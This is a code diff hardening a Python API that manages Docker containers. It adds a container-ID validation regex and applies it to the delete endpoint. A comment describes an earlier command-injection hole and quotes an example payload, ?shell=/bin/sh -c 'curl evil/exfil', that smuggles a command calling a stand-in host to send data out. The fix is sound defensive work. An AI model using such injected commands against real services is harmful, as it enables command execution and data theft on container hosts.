@@ -33,6 +33,21 @@ def get_db():
 # `shell` query parameter was forwarded to shlex.split + aiodocker.exec
 # verbatim, which let a caller smuggle a full command line via something
 # like ?shell=/bin/sh+-c+'curl%20evil/exfil'.
+# Valid container identifiers per Docker: either a hex id (12 or 64 chars,
+# but the daemon accepts any prefix >= 1) or a name matching the docker
+# name regex `[a-zA-Z0-9][a-zA-Z0-9_.-]*`. We accept the union and cap at
+# 255 chars so a hostile caller can't smuggle URL-path tricks through the
+# `{container_id}` placeholder into the aiodocker client.
+import re as _re
+_CONTAINER_ID_RE = _re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,254}$")
+
+
+def _validate_container_id(container_id: str) -> str:
+    if not isinstance(container_id, str) or not _CONTAINER_ID_RE.match(container_id):
+        raise HTTPException(status_code=400, detail="Invalid container id")
+    return container_id
+
+
 ALLOWED_EXEC_SHELLS = frozenset({
     "/bin/sh",
     "/bin/bash",
@@ -177,6 +192,7 @@ async def delete_container(
     Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
 ):
     auth_check(Authorize)
+    container_id = _validate_container_id(container_id)
     user = Authorize.get_jwt_subject()
 
     docker = aiodocker.Docker(url=settings.DOCKER_HOST)
